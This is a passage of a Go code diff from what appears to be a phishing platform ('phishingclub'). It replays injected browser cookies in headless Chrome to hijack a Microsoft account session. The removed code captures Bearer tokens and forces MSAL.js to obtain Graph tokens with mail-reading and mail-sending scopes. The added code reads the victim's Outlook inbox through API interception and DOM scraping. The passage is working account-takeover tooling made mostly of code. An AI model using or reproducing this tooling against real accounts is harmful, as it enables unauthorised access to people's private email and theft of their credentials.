@@ -10,6 +10,8 @@ import (
 	"sync"
 	"time"
 
+	"github.com/phishingclub/phishingclub/model"
+
 	"github.com/go-rod/rod"
 	"github.com/go-rod/rod/lib/input"
 	"github.com/go-rod/rod/lib/launcher"
@@ -90,12 +92,11 @@ func (b *BrowserSessionService) launchBrowser(ctx context.Context, timeout time.
 	return browser, cleanup, nil
 }
 
-// establishSSOSession injects cookies, navigates to login.live.com, then to Outlook
-// Returns the page with Outlook loaded and the intercepted Bearer token
-func (b *BrowserSessionService) establishSSOSession(browser *rod.Browser, cookies []cookieEntry) (*rod.Page, string, string, string, error) {
+// setupPageWithCookiesAndSSO creates a page, injects cookies, and navigates through SSO to Outlook
+func (b *BrowserSessionService) setupPageWithCookiesAndSSO(browser *rod.Browser, cookies []cookieEntry) (*rod.Page, error) {
 	page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
 	if err != nil {
-		return nil, "", "", "", fmt.Errorf("failed to create page: %w", err)
+		return nil, fmt.Errorf("failed to create page: %w", err)
 	}
 
 	// Inject cookies
@@ -104,147 +105,10 @@ func (b *BrowserSessionService) establishSSOSession(browser *rod.Browser, cookie
 		b.Logger.Warnw("some cookies failed to inject", "error", err)
 	}
 
-	// Set up network interception to capture Bearer tokens from Outlook API calls
-	var capturedToken string
-	var capturedSubstrateToken string
-	var capturedEmail string
-	var capturedDisplayName string
-	var tokenMu sync.Mutex
-
-	// Enable network events
-	err = proto.NetworkEnable{}.Call(page)
-	if err != nil {
-		b.Logger.Warnw("failed to enable network events", "error", err)
-	}
-
-	// Listen for network requests that contain Authorization: Bearer headers
-	waitEvents := page.EachEvent(
-		func(e *proto.NetworkRequestWillBeSent) {
-			reqURL := e.Request.URL
-
-			for key, val := range e.Request.Headers {
-				if !strings.EqualFold(key, "Authorization") {
-					continue
-				}
-				authVal := val.String()
-				if !strings.HasPrefix(authVal, "Bearer ") {
-					continue
-				}
-				bearerToken := strings.TrimPrefix(authVal, "Bearer ")
-
-				// Log ALL Bearer tokens for debugging
-				isJWT := strings.Contains(bearerToken, ".")
-				tokenPrefix := bearerToken
-				if len(tokenPrefix) > 30 {
-					tokenPrefix = tokenPrefix[:30]
-				}
-
-				b.Logger.Debugw("intercepted Bearer token",
-					"url", reqURL,
-					"isJWT", isJWT,
-					"tokenLen", len(bearerToken),
-					"prefix", tokenPrefix,
-				)
-
-				if !isJWT {
-					continue
-				}
-
-				tokenMu.Lock()
-				// Prioritize Graph API tokens
-				if strings.Contains(reqURL, "graph.microsoft.com") {
-					capturedToken = bearerToken
-					b.Logger.Infow("captured Graph API Bearer token", "url", reqURL, "tokenLen", len(bearerToken))
-				} else if strings.Contains(reqURL, "substrate.office.com") && capturedSubstrateToken == "" {
-					capturedSubstrateToken = bearerToken
-					b.Logger.Infow("captured substrate Bearer token", "url", reqURL, "tokenLen", len(bearerToken))
-				} else if capturedToken == "" {
-					// Any other JWT from Outlook APIs
-					isOutlookAPI := strings.Contains(reqURL, "outlook.office.com") ||
-						strings.Contains(reqURL, "outlook.office365.com") ||
-						(strings.Contains(reqURL, "outlook.live.com") && strings.Contains(reqURL, "/owa/"))
-					if isOutlookAPI {
-						capturedToken = bearerToken
-						b.Logger.Infow("captured Outlook API Bearer token", "url", reqURL, "tokenLen", len(bearerToken))
-					}
-				}
-				tokenMu.Unlock()
-			}
-		},
-		func(e *proto.NetworkResponseReceived) {
-			reqURL := e.Response.URL
-
-			// Capture tokens from OAuth token endpoint responses
-			isTokenEndpoint := strings.Contains(reqURL, "/oauth2/v2.0/token") ||
-				strings.Contains(reqURL, "/consumers/oauth2/v2.0/token")
-
-			if isTokenEndpoint {
-				b.Logger.Infow("intercepted token endpoint response", "url", reqURL, "status", e.Response.Status)
-				body, bodyErr := proto.NetworkGetResponseBody{RequestID: e.RequestID}.Call(page)
-				if bodyErr != nil {
-					b.Logger.Debugw("failed to get token response body", "error", bodyErr)
-					return
-				}
-
-				var tokenResp struct {
-					AccessToken string `json:"access_token"`
-					ExpiresIn   int    `json:"expires_in"`
-					Scope       string `json:"scope"`
-				}
-				if json.Unmarshal([]byte(body.Body), &tokenResp) == nil && tokenResp.AccessToken != "" {
-					if strings.Contains(tokenResp.AccessToken, ".") {
-						scope := strings.ToLower(tokenResp.Scope)
-						tokenMu.Lock()
-						// Prefer tokens with Mail scope
-						if strings.Contains(scope, "mail") {
-							capturedToken = tokenResp.AccessToken
-							b.Logger.Infow("captured JWT with Mail scope from token endpoint",
-								"scope", tokenResp.Scope,
-								"expiresIn", tokenResp.ExpiresIn,
-							)
-						} else if capturedToken == "" {
-							capturedToken = tokenResp.AccessToken
-							b.Logger.Infow("captured JWT from token endpoint",
-								"scope", tokenResp.Scope,
-								"expiresIn", tokenResp.ExpiresIn,
-							)
-						}
-						tokenMu.Unlock()
-					}
-				}
-			}
-
-			// Capture email from profile responses
-			if strings.Contains(reqURL, "graph.microsoft.com") && strings.Contains(reqURL, "/me") {
-				body, bodyErr := proto.NetworkGetResponseBody{RequestID: e.RequestID}.Call(page)
-				if bodyErr == nil {
-					var profile struct {
-						Mail        string `json:"mail"`
-						DisplayName string `json:"displayName"`
-						UPN         string `json:"userPrincipalName"`
-					}
-					if json.Unmarshal([]byte(body.Body), &profile) == nil {
-						tokenMu.Lock()
-						if profile.Mail != "" {
-							capturedEmail = profile.Mail
-						} else if profile.UPN != "" {
-							capturedEmail = profile.UPN
-						}
-						if profile.DisplayName != "" {
-							capturedDisplayName = profile.DisplayName
-						}
-						tokenMu.Unlock()
-					}
-				}
-			}
-		},
-	)
-	_ = waitEvents
-
-	// Step 1: Navigate to login.live.com to establish SSO session
+	// Navigate to login.live.com to establish SSO session
 	b.Logger.Infow("navigating to login.live.com to establish SSO session")
 	if err := page.Navigate("https://login.live.com/"); err != nil {
-		return nil, "", "", "", fmt.Errorf("failed to navigate to login.live.com: %w", err)
+		return nil, fmt.Errorf("failed to navigate to login.live.com: %w", err)
 	}
 	if err := page.WaitLoad(); err != nil {
 		b.Logger.Warnw("login.live.com load timeout, continuing", "error", err)
@@ -254,266 +118,44 @@ func (b *BrowserSessionService) establishSSOSession(browser *rod.Browser, cookie
 	currentURL := page.MustInfo().URL
 	b.Logger.Infow("after login.live.com navigation", "currentURL", currentURL)
 
-	// Check if SSO failed
+	// Check if SSO failed (still on login page with email input)
 	if strings.Contains(currentURL, "login.live.com") && !strings.Contains(currentURL, "account.microsoft.com") {
 		el, err := page.Element("#i0116")
 		if err == nil && el != nil {
-			b.Logger.Warnw("SSO session not established - cookies may be expired")
-			return page, "", "", "", fmt.Errorf("cookies did not establish SSO session - session may be expired")
+			return nil, fmt.Errorf("cookies did not establish SSO session - session may be expired")
 		}
 	}
 
-	// Step 2: Navigate to Outlook
-	b.Logger.Infow("navigating to outlook.live.com/mail/ to trigger token acquisition")
+	return page, nil
+}
+
+// navigateToOutlook navigates a page (with SSO established) to Outlook inbox
+func (b *BrowserSessionService) navigateToOutlook(page *rod.Page) error {
+	b.Logger.Infow("navigating to outlook.live.com/mail/")
 	if err := page.Navigate("https://outlook.live.com/mail/"); err != nil {
-		return nil, "", "", "", fmt.Errorf("failed to navigate to outlook.live.com: %w", err)
+		return fmt.Errorf("failed to navigate to outlook.live.com: %w", err)
 	}
 	if err := page.WaitLoad(); err != nil {
 		b.Logger.Warnw("outlook.live.com load timeout, continuing", "error", err)
 	}
+	time.Sleep(5 * time.Second)
 
-	// Wait for Outlook to fully load and make API calls (which we intercept)
-	b.Logger.Infow("waiting for Outlook API calls to capture Bearer token...")
-	for i := 0; i < 15; i++ {
-		time.Sleep(2 * time.Second)
-		tokenMu.Lock()
-		hasToken := capturedToken != ""
-		tokenMu.Unlock()
-		if hasToken {
-			b.Logger.Infow("Bearer token captured from network interception")
-			break
-		}
-		if i == 5 {
-			page.Eval(`() => { window.scrollTo(0, 100); }`)
-		}
-	}
-
-	// Check final page state
-	finalURL := page.MustInfo().URL
+	// Verify we're on Outlook
 	pageTitle, _ := page.Eval(`() => document.title`)
 	title := ""
 	if pageTitle != nil {
 		title = pageTitle.Value.String()
 	}
-	b.Logger.Infow("final page state", "url", finalURL, "title", title)
+	b.Logger.Infow("Outlook page loaded", "title", title, "url", page.MustInfo().URL)
 
-	// Step 3: If no token from network interception, try forcing MSAL.js to acquire a Graph token
-	tokenMu.Lock()
-	needMSAL := capturedToken == ""
-	tokenMu.Unlock()
-
-	if needMSAL {
-		b.Logger.Infow("no token from network, attempting MSAL.js acquireTokenSilent for Graph scopes")
-		graphToken := b.forceAcquireGraphToken(page)
-		if graphToken != "" {
-			tokenMu.Lock()
-			capturedToken = graphToken
-			tokenMu.Unlock()
-			b.Logger.Infow("acquired Graph token via MSAL.js acquireTokenSilent", "tokenLen", len(graphToken))
-		}
+	if !strings.Contains(strings.ToLower(title), "mail") && !strings.Contains(strings.ToLower(title), "outlook") {
+		return fmt.Errorf("failed to load Outlook - page title: %s", title)
 	}
 
-	// Step 4: If still no token, try extracting from MSAL cache with strict filtering
-	tokenMu.Lock()
-	if capturedToken == "" {
-		b.Logger.Infow("trying MSAL cache extraction with strict scope filtering")
-		token := b.extractJWTFromMSALCache(page)
-		if token != "" {
-			capturedToken = token
-		}
-	}
-	// If we have a substrate token but no Graph/Outlook token, use substrate as fallback
-	if capturedToken == "" && capturedSubstrateToken != "" {
-		b.Logger.Infow("using substrate token as fallback")
-		capturedToken = capturedSubstrateToken
-	}
-	tokenMu.Unlock()
-
-	// Extract email and display name
-	if capturedEmail == "" || capturedDisplayName == "" {
-		email, name := b.extractAccountInfo(page)
-		if email != "" && capturedEmail == "" {
-			capturedEmail = email
-		}
-		if name != "" && capturedDisplayName == "" {
-			capturedDisplayName = name
-		}
-	}
-
-	// Try to extract display name from page title ("Mail - Jenessa Crook - Outlook")
-	if capturedDisplayName == "" && strings.Contains(title, " - ") {
-		parts := strings.Split(title, " - ")
-		if len(parts) >= 2 {
-			capturedDisplayName = strings.TrimSpace(parts[1])
-		}
-	}
-
-	// Try to extract email from DOM
-	if capturedEmail == "" {
-		capturedEmail = b.extractEmailFromDOM(page)
-	}
-
-	tokenMu.Lock()
-	defer tokenMu.Unlock()
-
-	return page, capturedToken, capturedEmail, capturedDisplayName, nil
+	return nil
 }
 
-// forceAcquireGraphToken uses MSAL.js acquireTokenSilent to get a Graph-scoped token
-func (b *BrowserSessionService) forceAcquireGraphToken(page *rod.Page) string {
-	// This script finds the MSAL PublicClientApplication instance and calls acquireTokenSilent
-	// with Graph API scopes (Mail.Read, Mail.Send, User.Read)
-	script := `() => {
-		return new Promise((resolve) => {
-			try {
-				// Find MSAL account from cache
-				let account = null;
-				const storages = [sessionStorage, localStorage];
-				for (const storage of storages) {
-					for (let i = 0; i < storage.length; i++) {
-						const key = storage.key(i);
-						if (key && key.includes('.account.') && !key.includes('accesstoken')) {
-							try {
-								const val = JSON.parse(storage.getItem(key));
-								if (val && val.username && val.homeAccountId) {
-									account = val;
-									break;
-								}
-							} catch(e) {}
-						}
-					}
-					if (account) break;
-				}
-
-				if (!account) {
-					resolve(JSON.stringify({error: 'no MSAL account found in cache'}));
-					return;
-				}
-
-				// Find the MSAL client ID from cache keys
-				let clientId = null;
-				for (const storage of storages) {
-					for (let i = 0; i < storage.length; i++) {
-						const key = storage.key(i);
-						if (key && key.includes('accesstoken') && key.includes(account.homeAccountId)) {
-							// Key format: homeAccountId-environment-credentialType-clientId-realm-target
-							const parts = key.split('-');
-							// Find the part that looks like a GUID (client ID)
-							for (const part of parts) {
-								if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(part)) {
-									clientId = part;
-									break;
-								}
-							}
-							if (clientId) break;
-						}
-					}
-					if (clientId) break;
-				}
-
-				if (!clientId) {
-					resolve(JSON.stringify({error: 'no MSAL client ID found'}));
-					return;
-				}
-
-				// Try to use the existing MSAL instance on the page
-				// Outlook web stores it in various global variables
-				const msalConfig = {
-					auth: {
-						clientId: clientId,
-						authority: 'https://login.microsoftonline.com/consumers',
-						redirectUri: window.location.origin
-					},
-					cache: {
-						cacheLocation: 'sessionStorage'
-					}
-				};
-
-				// Check if msal is available globally
-				if (typeof msal !== 'undefined' && msal.PublicClientApplication) {
-					const pca = new msal.PublicClientApplication(msalConfig);
-					const msalAccount = {
-						homeAccountId: account.homeAccountId,
-						environment: account.environment || 'login.microsoftonline.com',
-						tenantId: account.realm || 'consumers',
-						username: account.username,
-						localAccountId: account.localAccountId || account.homeAccountId.split('.')[0]
-					};
-
-					pca.acquireTokenSilent({
-						scopes: ['https://graph.microsoft.com/Mail.Read', 'https://graph.microsoft.com/Mail.Send', 'https://graph.microsoft.com/User.Read'],
-						account: msalAccount,
-						forceRefresh: false
-					}).then(response => {
-						resolve(JSON.stringify({token: response.accessToken, scopes: response.scopes}));
-					}).catch(err => {
-						// Try with just openid profile
-						pca.acquireTokenSilent({
-							scopes: ['https://graph.microsoft.com/.default'],
-							account: msalAccount,
-							forceRefresh: false
-						}).then(response => {
-							resolve(JSON.stringify({token: response.accessToken, scopes: response.scopes}));
-						}).catch(err2 => {
-							resolve(JSON.stringify({error: 'acquireTokenSilent failed: ' + err2.message, account: account.username, clientId: clientId}));
-						});
-					});
-				} else {
-					// MSAL library not available as global, try to find it via webpack modules
-					resolve(JSON.stringify({error: 'MSAL not available globally', account: account.username, clientId: clientId}));
-				}
-			} catch(e) {
-				resolve(JSON.stringify({error: 'exception: ' + e.message}));
-			}
-
-			// Timeout after 15 seconds
-			setTimeout(() => resolve(JSON.stringify({error: 'timeout'})), 15000);
-		});
-	}`
-
-	result, err := page.Eval(script)
-	if err != nil {
-		b.Logger.Warnw("forceAcquireGraphToken eval failed", "error", err)
-		return ""
-	}
-	if result == nil {
-		return ""
-	}
-
-	val := result.Value.String()
-	b.Logger.Infow("forceAcquireGraphToken result", "result", val)
-
-	var resp struct {
-		Token    string   `json:"token"`
-		Scopes   []string `json:"scopes"`
-		Error    string   `json:"error"`
-		Account  string   `json:"account"`
-		ClientID string   `json:"clientId"`
-	}
-	if json.Unmarshal([]byte(val), &resp) != nil {
-		return ""
-	}
-
-	if resp.Token != "" && strings.Contains(resp.Token, ".") {
-		b.Logger.Infow("successfully acquired Graph token via MSAL.js",
-			"scopes", resp.Scopes,
-			"tokenLen", len(resp.Token),
-		)
-		return resp.Token
-	}
-
-	if resp.Error != "" {
-		b.Logger.Warnw("MSAL.js acquireTokenSilent failed",
-			"error", resp.Error,
-			"account", resp.Account,
-			"clientId", resp.ClientID,
-		)
-	}
-
-	return ""
-}
-
-// ValidateAndGetToken uses headless Chrome to validate cookies and obtain an access token.
+// ValidateAndGetToken uses headless Chrome to validate cookies and extract account info.
 func (b *BrowserSessionService) ValidateAndGetToken(ctx context.Context, cookiesJSON string) (*BrowserSessionResult, error) {
 	b.mu.Lock()
 	defer b.mu.Unlock()
@@ -529,46 +171,855 @@ func (b *BrowserSessionService) ValidateAndGetToken(ctx context.Context, cookies
 		return &BrowserSessionResult{Valid: false, Error: "no cookies to inject"}, nil
 	}
 
-	browser, cleanup, err := b.launchBrowser(ctx, 120*time.Second)
+	browser, cleanup, err := b.launchBrowser(ctx, 90*time.Second)
 	if err != nil {
 		return nil, err
 	}
 	defer cleanup()
 
-	_, token, email, displayName, err := b.establishSSOSession(browser, cookies)
+	page, err := b.setupPageWithCookiesAndSSO(browser, cookies)
 	if err != nil {
-		return &BrowserSessionResult{
-			Valid: false,
-			Error: err.Error(),
-		}, nil
+		return &BrowserSessionResult{Valid: false, Error: err.Error()}, nil
+	}
+
+	// Navigate to Outlook
+	if err := b.navigateToOutlook(page); err != nil {
+		// Even if Outlook fails, we might have SSO info
+		b.Logger.Warnw("Outlook navigation failed", "error", err)
+	}
+
+	// Extract account info
+	email, displayName := b.extractAccountInfo(page)
+	if email == "" {
+		email = b.extractEmailFromDOM(page)
+	}
+
+	// Try to extract display name from page title ("Mail - Jenessa Crook - Outlook")
+	if displayName == "" {
+		pageTitle, _ := page.Eval(`() => document.title`)
+		if pageTitle != nil {
+			title := pageTitle.Value.String()
+			if strings.Contains(title, " - ") {
+				parts := strings.Split(title, " - ")
+				if len(parts) >= 2 {
+					displayName = strings.TrimSpace(parts[1])
+				}
+			}
+		}
 	}
 
 	result := &BrowserSessionResult{
-		Valid:       token != "",
+		Valid:       email != "" || displayName != "",
 		Email:       email,
 		DisplayName: displayName,
-		AccessToken: token,
+		AccessToken: "", // MSA consumer accounts don't provide JWT tokens
 	}
 
 	if !result.Valid {
-		// Even without a token, if we got email/displayName the session is valid
-		if email != "" || displayName != "" {
-			result.Valid = true
-			result.Error = "session valid but no API token acquired"
-		} else {
-			result.Error = "could not capture a valid JWT access token from Outlook"
-		}
+		result.Error = "could not extract account info from Outlook"
 	}
 
 	b.Logger.Infow("browser session validation complete",
 		"valid", result.Valid,
 		"email", result.Email,
 		"displayName", result.DisplayName,
-		"hasToken", result.AccessToken != "",
-		"tokenLen", len(result.AccessToken),
 	)
 
 	return result, nil
+}
+
+// ReadInboxViaBrowser reads inbox messages by intercepting Outlook's internal API responses
+func (b *BrowserSessionService) ReadInboxViaBrowser(ctx context.Context, cookiesJSON string, folder string, limit int, skip int) ([]model.InboxMessage, int, error) {
+	b.mu.Lock()
+	defer b.mu.Unlock()
+
+	b.Logger.Infow("reading inbox via browser automation", "folder", folder, "limit", limit, "skip", skip)
+
+	var cookies []cookieEntry
+	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
+		return nil, 0, fmt.Errorf("failed to parse cookies JSON: %w", err)
+	}
+
+	browser, cleanup, err := b.launchBrowser(ctx, 120*time.Second)
+	if err != nil {
+		return nil, 0, err
+	}
+	defer cleanup()
+
+	page, err := b.setupPageWithCookiesAndSSO(browser, cookies)
+	if err != nil {
+		return nil, 0, err
+	}
+
+	// Enable network interception to capture Outlook's API responses
+	var capturedMessages []model.InboxMessage
+	var capturedCount int
+	var messagesMu sync.Mutex
+	var messagesFound bool
+
+	err = proto.NetworkEnable{}.Call(page)
+	if err != nil {
+		b.Logger.Warnw("failed to enable network events", "error", err)
+	}
+
+	// Listen for Outlook API responses that contain message data
+	waitEvents := page.EachEvent(
+		func(e *proto.NetworkResponseReceived) {
+			reqURL := e.Response.URL
+
+			// Outlook web fetches messages from these endpoints:
+			// - substrate.office.com/owa/...
+			// - outlook.live.com/owa/...
+			// - outlook.office.com/api/...
+			isMessageAPI := (strings.Contains(reqURL, "/owa/") && strings.Contains(reqURL, "FindItem")) ||
+				(strings.Contains(reqURL, "/owa/") && strings.Contains(reqURL, "GetConversationItems")) ||
+				(strings.Contains(reqURL, "/owa/") && strings.Contains(reqURL, "FindConversation")) ||
+				(strings.Contains(reqURL, "/api/") && strings.Contains(reqURL, "messages")) ||
+				(strings.Contains(reqURL, "substrate.office.com") && (strings.Contains(reqURL, "messages") || strings.Contains(reqURL, "Items") || strings.Contains(reqURL, "Conversation")))
+
+			if !isMessageAPI {
+				return
+			}
+
+			if e.Response.Status != 200 {
+				return
+			}
+
+			b.Logger.Infow("intercepted Outlook API response", "url", reqURL, "status", e.Response.Status)
+
+			body, bodyErr := proto.NetworkGetResponseBody{RequestID: e.RequestID}.Call(page)
+			if bodyErr != nil {
+				b.Logger.Debugw("failed to get API response body", "error", bodyErr)
+				return
+			}
+
+			messages := b.parseOutlookAPIResponse(body.Body, reqURL)
+			if len(messages) > 0 {
+				messagesMu.Lock()
+				capturedMessages = append(capturedMessages, messages...)
+				capturedCount = len(capturedMessages)
+				messagesFound = true
+				b.Logger.Infow("extracted messages from API response", "count", len(messages), "totalSoFar", capturedCount)
+				messagesMu.Unlock()
+			}
+		},
+	)
+	_ = waitEvents
+
+	// Navigate to Outlook - this will trigger API calls that we intercept
+	if err := b.navigateToOutlook(page); err != nil {
+		return nil, 0, err
+	}
+
+	// Wait for API responses to be intercepted
+	b.Logger.Infow("waiting for Outlook API responses...")
+	for i := 0; i < 20; i++ {
+		time.Sleep(2 * time.Second)
+		messagesMu.Lock()
+		found := messagesFound
+		messagesMu.Unlock()
+		if found {
+			// Wait a bit more for any additional responses
+			time.Sleep(3 * time.Second)
+			break
+		}
+	}
+
+	messagesMu.Lock()
+	defer messagesMu.Unlock()
+
+	// If no API responses were intercepted, fall back to DOM scraping
+	if !messagesFound {
+		b.Logger.Infow("no API responses intercepted, falling back to DOM scraping")
+		capturedMessages = b.scrapeInboxFromDOM(page)
+		capturedCount = len(capturedMessages)
+	}
+
+	// Apply pagination
+	if skip >= len(capturedMessages) {
+		return []model.InboxMessage{}, capturedCount, nil
+	}
+	end := skip + limit
+	if end > len(capturedMessages) {
+		end = len(capturedMessages)
+	}
+
+	b.Logger.Infow("inbox read complete", "totalMessages", capturedCount, "returned", end-skip)
+	return capturedMessages[skip:end], capturedCount, nil
+}
+
+// parseOutlookAPIResponse parses various Outlook API response formats into InboxMessage
+func (b *BrowserSessionService) parseOutlookAPIResponse(body string, reqURL string) []model.InboxMessage {
+	var messages []model.InboxMessage
+
+	// Try parsing as OWA FindConversation/FindItem response
+	var owaResp struct {
+		Body struct {
+			ResponseMessages struct {
+				Items []struct {
+					RootFolder struct {
+						Items []json.RawMessage `json:"Items"`
+					} `json:"RootFolder"`
+				} `json:"Items"`
+			} `json:"ResponseMessages"`
+			Conversations []json.RawMessage `json:"Conversations"`
+		} `json:"Body"`
+	}
+	if json.Unmarshal([]byte(body), &owaResp) == nil {
+		// Try conversations
+		for _, conv := range owaResp.Body.Conversations {
+			msg := b.parseOWAConversation(conv)
+			if msg != nil {
+				messages = append(messages, *msg)
+			}
+		}
+		if len(messages) > 0 {
+			return messages
+		}
+	}
+
+	// Try parsing as substrate/OWA response with different structure
+	var substrateResp struct {
+		Value []json.RawMessage `json:"value"`
+	}
+	if json.Unmarshal([]byte(body), &substrateResp) == nil && len(substrateResp.Value) > 0 {
+		for _, item := range substrateResp.Value {
+			msg := b.parseSubstrateMessage(item)
+			if msg != nil {
+				messages = append(messages, *msg)
+			}
+		}
+		if len(messages) > 0 {
+			return messages
+		}
+	}
+
+	// Try parsing as OWA FindConversation with Conversations array at top level
+	var convResp struct {
+		Conversations []json.RawMessage `json:"Conversations"`
+	}
+	if json.Unmarshal([]byte(body), &convResp) == nil && len(convResp.Conversations) > 0 {
+		for _, conv := range convResp.Conversations {
+			msg := b.parseOWAConversation(conv)
+			if msg != nil {
+				messages = append(messages, *msg)
+			}
+		}
+		if len(messages) > 0 {
+			return messages
+		}
+	}
+
+	// Try parsing as direct message array
+	var directMessages []json.RawMessage
+	if json.Unmarshal([]byte(body), &directMessages) == nil && len(directMessages) > 0 {
+		for _, item := range directMessages {
+			msg := b.parseSubstrateMessage(item)
+			if msg != nil {
+				messages = append(messages, *msg)
+			}
+		}
+	}
+
+	return messages
+}
+
+// parseOWAConversation parses an OWA conversation object into InboxMessage
+func (b *BrowserSessionService) parseOWAConversation(raw json.RawMessage) *model.InboxMessage {
+	var conv struct {
+		ConversationID struct {
+			ID string `json:"Id"`
+		} `json:"ConversationId"`
+		ConversationTopic string `json:"ConversationTopic"`
+		LastDeliveryTime  string `json:"LastDeliveryTime"`
+		Preview           string `json:"Preview"`
+		UnreadCount       int    `json:"UnreadCount"`
+		HasAttachments    bool   `json:"HasAttachments"`
+		LastSender        struct {
+			Mailbox struct {
+				Name         string `json:"Name"`
+				EmailAddress string `json:"EmailAddress"`
+			} `json:"Mailbox"`
+		} `json:"LastSender"`
+		From struct {
+			Mailbox struct {
+				Name         string `json:"Name"`
+				EmailAddress string `json:"EmailAddress"`
+			} `json:"Mailbox"`
+		} `json:"From"`
+		GlobalMessageCount int `json:"GlobalMessageCount"`
+	}
+
+	if err := json.Unmarshal(raw, &conv); err != nil {
+		return nil
+	}
+
+	if conv.ConversationTopic == "" && conv.ConversationID.ID == "" {
+		return nil
+	}
+
+	from := conv.LastSender.Mailbox.EmailAddress
+	fromName := conv.LastSender.Mailbox.Name
+	if from == "" {
+		from = conv.From.Mailbox.EmailAddress
+		fromName = conv.From.Mailbox.Name
+	}
+
+	return &model.InboxMessage{
+		ID:             conv.ConversationID.ID,
+		From:           from,
+		FromName:       fromName,
+		Subject:        conv.ConversationTopic,
+		Preview:        conv.Preview,
+		Date:           conv.LastDeliveryTime,
+		IsRead:         conv.UnreadCount == 0,
+		HasAttachments: conv.HasAttachments,
+		ConversationID: conv.ConversationID.ID,
+	}
+}
+
+// parseSubstrateMessage parses a substrate/REST API message object into InboxMessage
+func (b *BrowserSessionService) parseSubstrateMessage(raw json.RawMessage) *model.InboxMessage {
+	var msg struct {
+		ID   string `json:"Id"`
+		OID  string `json:"id"` // lowercase for Graph/REST format
+		From struct {
+			EmailAddress struct {
+				Name    string `json:"Name"`
+				Address string `json:"Address"`
+				// Also try lowercase
+				NameL    string `json:"name"`
+				AddressL string `json:"address"`
+			} `json:"EmailAddress"`
+			// Also try lowercase
+			EmailAddressL struct {
+				Name    string `json:"name"`
+				Address string `json:"address"`
+			} `json:"emailAddress"`
+		} `json:"From"`
+		FromL struct {
+			EmailAddress struct {
+				Name    string `json:"name"`
+				Address string `json:"address"`
+			} `json:"emailAddress"`
+		} `json:"from"`
+		Subject        string `json:"Subject"`
+		SubjectL       string `json:"subject"`
+		ReceivedTime   string `json:"ReceivedDateTime"`
+		ReceivedTimeL  string `json:"receivedDateTime"`
+		DateTimeRcvd   string `json:"DateTimeReceived"`
+		Preview        string `json:"Preview"`
+		PreviewL       string `json:"bodyPreview"`
+		BodyPreview    string `json:"BodyPreview"`
+		IsRead         bool   `json:"IsRead"`
+		IsReadL        bool   `json:"isRead"`
+		HasAttachments bool   `json:"HasAttachments"`
+		HasAttachL     bool   `json:"hasAttachments"`
+		ConvID         struct {
+			ID string `json:"Id"`
+		} `json:"ConversationId"`
+		ConvIDL string `json:"conversationId"`
+	}
+
+	if err := json.Unmarshal(raw, &msg); err != nil {
+		return nil
+	}
+
+	id := msg.ID
+	if id == "" {
+		id = msg.OID
+	}
+	if id == "" {
+		return nil
+	}
+
+	subject := msg.Subject
+	if subject == "" {
+		subject = msg.SubjectL
+	}
+
+	from := msg.From.EmailAddress.Address
+	fromName := msg.From.EmailAddress.Name
+	if from == "" {
+		from = msg.From.EmailAddress.AddressL
+		fromName = msg.From.EmailAddress.NameL
+	}
+	if from == "" {
+		from = msg.From.EmailAddressL.Address
+		fromName = msg.From.EmailAddressL.Name
+	}
+	if from == "" {
+		from = msg.FromL.EmailAddress.Address
+		fromName = msg.FromL.EmailAddress.Name
+	}
+
+	date := msg.ReceivedTime
+	if date == "" {
+		date = msg.ReceivedTimeL
+	}
+	if date == "" {
+		date = msg.DateTimeRcvd
+	}
+
+	preview := msg.Preview
+	if preview == "" {
+		preview = msg.PreviewL
+	}
+	if preview == "" {
+		preview = msg.BodyPreview
+	}
+
+	convID := msg.ConvID.ID
+	if convID == "" {
+		convID = msg.ConvIDL
+	}
+
+	isRead := msg.IsRead || msg.IsReadL
+	hasAttach := msg.HasAttachments || msg.HasAttachL
+
+	return &model.InboxMessage{
+		ID:             id,
+		From:           from,
+		FromName:       fromName,
+		Subject:        subject,
+		Preview:        preview,
+		Date:           date,
+		IsRead:         isRead,
+		HasAttachments: hasAttach,
+		ConversationID: convID,
+	}
+}
+
+// scrapeInboxFromDOM extracts messages from the rendered Outlook page as a fallback
+func (b *BrowserSessionService) scrapeInboxFromDOM(page *rod.Page) []model.InboxMessage {
+	script := `() => {
+		try {
+			const messages = [];
+			// Try multiple selector strategies for Outlook web
+			const selectors = [
+				'div[data-convid]',
+				'div[role="option"]',
+				'div[aria-label][data-is-focusable="true"]',
+				'div.customScrollBar div[tabindex]',
+			];
+			
+			let items = [];
+			for (const sel of selectors) {
+				items = document.querySelectorAll(sel);
+				if (items.length > 0) break;
+			}
+			
+			items.forEach((item, index) => {
+				// Extract sender
+				let sender = '';
+				let senderName = '';
+				const senderEl = item.querySelector('[data-testid="SenderName"]') ||
+				                 item.querySelector('span[class*="lvHighlightAllClass"]') ||
+				                 item.querySelector('span[class*="OZZZK"]');
+				if (senderEl) {
+					senderName = senderEl.textContent.trim();
+					sender = senderName;
+				}
+				
+				// Extract subject
+				let subject = '';
+				const subjectEl = item.querySelector('[data-testid="SubjectLine"]') ||
+				                  item.querySelector('span[class*="lvHighlightSubjectClass"]') ||
+				                  item.querySelector('span[class*="jGG6V"]');
+				if (subjectEl) {
+					subject = subjectEl.textContent.trim();
+				}
+				
+				// Extract preview
+				let preview = '';
+				const previewEl = item.querySelector('[data-testid="BodyPreview"]') ||
+				                  item.querySelector('span[class*="Mc1Ri"]');
+				if (previewEl) {
+					preview = previewEl.textContent.trim();
+				}
+				
+				// Extract date
+				let date = '';
+				const dateEl = item.querySelector('[data-testid="DateLine"]') ||
+				               item.querySelector('span[class*="jHATS"]') ||
+				               item.querySelector('span[class*="ms-font-weight-regular"]');
+				if (dateEl) {
+					date = dateEl.textContent.trim();
+				}
+				
+				// Extract conversation ID
+				let convId = item.getAttribute('data-convid') || '';
+				
+				// Check if read
+				let isRead = !item.querySelector('[class*="unread"]') && 
+				             !item.classList.contains('unread');
+				
+				// Check attachments
+				let hasAttach = !!item.querySelector('[data-icon-name="Attach"]') ||
+				                !!item.querySelector('i[class*="attach"]');
+				
+				if (sender || subject) {
+					messages.push({
+						id: convId || 'dom-' + index,
+						from: sender,
+						fromName: senderName,
+						subject: subject,
+						preview: preview,
+						date: date,
+						isRead: isRead,
+						hasAttachments: hasAttach,
+						conversationId: convId
+					});
+				}
+			});
+			
+			// Also try aria-label based extraction as last resort
+			if (messages.length === 0) {
+				const allItems = document.querySelectorAll('[aria-label]');
+				allItems.forEach((item, index) => {
+					const label = item.getAttribute('aria-label') || '';
